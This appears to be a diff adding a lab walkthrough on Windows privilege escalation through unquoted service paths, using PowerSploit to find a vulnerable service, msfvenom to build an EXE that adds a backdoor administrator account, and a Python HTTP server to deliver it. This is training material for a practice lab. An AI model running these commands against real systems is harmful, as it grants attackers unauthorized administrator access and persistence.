@@ -104,3 +104,62 @@ Look at this path: `C:\Users\Marty McFly\run.exe`
 
 There is a space in between Marty and Mcfly, and that path is not quoted.
 Windows will look for run.exe, but since the path isn't quoted, it goes through the path and looks for files to run. It will end up stopping at Marty (thinking there is a file at _C:\Users_. It will run any file named Marty, and if there is no file, it moves on. Luckily, Windows runs this file with the highest privligas. We can put a file in the unquoted service path to run a payload.
+
+### Finding Unquoted Service Paths
+For the Pwn Twn lab, we need to find unquoted service paths.
+
+In Powershell, CD to the PowerSploit folder located in `C:1\Users\Public\pentest-tools\PowerSploit-master`. This contains a ton of useful tools. Go ahead and import the module:
+```
+Import-Module .\Privesc.psd1
+```
+and check for unquoted service packs:
+```
+Get-UnquotedService
+```
+Your output should look something like this:
+```diff
+ServiceName    : Pwn Town Monitoring Agent
++Path           : C:\Program Files\Pwn Town\Pwn Agent\agent.exe
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'Pwn Town Monitoring Agent' -Path <HijackPath>
+CanRestart     : False
+Name           : Pwn Town Monitoring Agent
+```
+
+The highlighted line is the unquoted path.
+
+```
+C:\Program Files\Pwn Town\Pwn Agent\agent.exe
+                   ^
+```
+
+One option would be to make an EXE file called _Pwn_ that contains a payload.
+
+### Making a Payload
+
+The payload that we will use creates a new admin account with the credentials you choose. This is perfect!
+
+A lot of the information in this section came from [this video on YouTube](https://www.youtube.com/watch?v=WWE7VIpgd5I).
+
+Start up a Kali Linux machine or VM, open terminal, and type this:
+
+```
+msfvenom -p windows/adduser USER=backdoom_admin PASS=<INSERTPASSWORD> -f exe > Pwn.exe
+```
+
+Don't forget to replace <INSERTPASSWORD> with the password you want. This is going to create a payload that creates a new user using msfvenom with the username *backdoor_admin*, the password of your choice, and it will make it all into an EXE file.
+    
+### Getting the Payload into Windows
+Now you need to get the payload into Windows. The best way to do this would be using your virtualization app's built in transfer, but you can also run thos command to make an HTTP file server with python:
+
+```
+sudo python -m SimpleHTTPServer 80
+```
+
+Now, go to the IP address of the VM in your web browser and add `:80` to the end.
+
+You should be able to navigate through and download the EXE to your computer.
+    
+(It might be better to watch [the video?](https://youtu.be/WWE7VIpgd5I?t=516))
+    
+When you have it on your computer, extract this into a ZIP file. On Windows, right click and choose _Send to Compressed (Zipped) Folder_. On Mac and Linux, Right Click and choose _Compress_. You can copy this to the Pwn Twn lab by copying and pasting it (most RDP clients have shared clipboards).
